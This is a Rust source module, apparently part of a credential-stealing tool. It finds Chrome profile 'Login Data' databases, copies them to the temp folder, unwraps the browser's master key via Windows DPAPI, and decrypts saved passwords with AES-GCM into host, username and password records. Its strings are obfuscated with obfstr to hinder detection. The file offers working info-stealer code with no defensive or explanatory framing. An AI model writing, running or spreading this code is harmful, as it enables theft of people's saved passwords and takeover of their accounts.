use aes_gcm::aead::generic_array::GenericArray;
use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit};
use base64::prelude::*;
use obfstr::obfstr;
use rusqlite::Connection;
use serde_json::Value;
use std::path::Path;
use std::{env, fs};
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

use crate::browser::Login;

pub fn get_creds_chrome(path: &Path) -> Option<Vec<Login>> {
    let key = get_key(&path)?;
    let files = path
        .read_dir()
        .ok()?
        .filter_map(|dir| dir.ok())
        .filter(|dir| dir.path().join(obfstr!("Login Data")).exists())
        .map(|dir| dir.path().join(obfstr!("Login Data")));
    let mut creds: Vec<Login> = Vec::new();
    for i in files {
        if let Some(mut cred) = get_creds_from_profile(i.as_path(), &key) {
            creds.append(&mut cred)
        }
    }
    if creds.is_empty() {
        return None;
    }
    Some(creds)
}

fn get_creds_from_profile(path: &Path, key: &Vec<u8>) -> Option<Vec<Login>> {
    let new_path = Path::new(&env::var("temp").ok()?).join(path.file_name()?);
    fs::copy(path, new_path.clone()).ok()?;
    let conn = Connection::open(new_path).ok()?;
    let mut rows = conn
        .prepare(obfstr!(
            "SELECT origin_url, username_value, password_value FROM logins;"
        ))
        .ok()?;
    let data = rows
        .query_map([], |row| {
            Ok((
                row.get::<usize, String>(0),
                row.get::<usize, String>(1),
                row.get::<usize, Vec<u8>>(2),
            ))
        })
        .ok()?;
    let data = data.filter_map(|data| data.ok());
    let logins: Vec<Login> = data
        .filter_map(|(result1, result2, result3)| {
            if let (Ok(value1), Ok(value2), Ok(value3)) = (result1, result2, result3) {
                Some((value1, value2, value3))
            } else {
                None
            }
        })
        .filter_map(|(value1, value2, value3)| {
            if let (value1, value2, Some(value3)) =
                (value1, value2, decrypt(&value3, (&key).to_vec()))
            {
                Some(Login {
                    host: value1,
                    user: value2,
                    pass: value3,
                })
            } else {
                None
            }
        })
        .collect();

    if logins.is_empty() {
        return None;
    }
    Some(logins)
}

fn get_key(path: &Path) -> Option<Vec<u8>> {
    let key_file = path.join(obfstr!("Local State"));
    let enc_key = &serde_json::from_str::<Value>(&fs::read_to_string(key_file).ok()?).ok()?
        [obfstr!("os_crypt")][obfstr!("encrypted_key")];
    let key_enc: String = serde_json::from_value(enc_key.clone()).ok()?;
    let key = &mut BASE64_STANDARD.decode(key_enc).ok()?[5..];
    let key_len = key.len();
    let key = key.as_mut_ptr();
    let mut data_in = CRYPT_INTEGER_BLOB {
        cbData: key_len as u32,
        pbData: key,
    };
    let mut data_out = unsafe { std::mem::zeroed() };
    unsafe { CryptUnprotectData(&mut data_in, None, None, None, None, 0, &mut data_out).ok()? }
    let size = data_out.cbData as usize;
    Some(unsafe { Vec::from_raw_parts(data_out.pbData, size, size) })
}

fn decrypt(data: &[u8], binding: Vec<u8>) -> Option<String> {
    let key = GenericArray::from_slice(&binding);
    let cipher = Aes256Gcm::new(key);
    let nonce = GenericArray::from_slice(&data[3..15]);
    let plaintext = cipher.decrypt(nonce, &data[15..]).ok()?;
    Some(String::from_utf8(plaintext).ok()?)
}
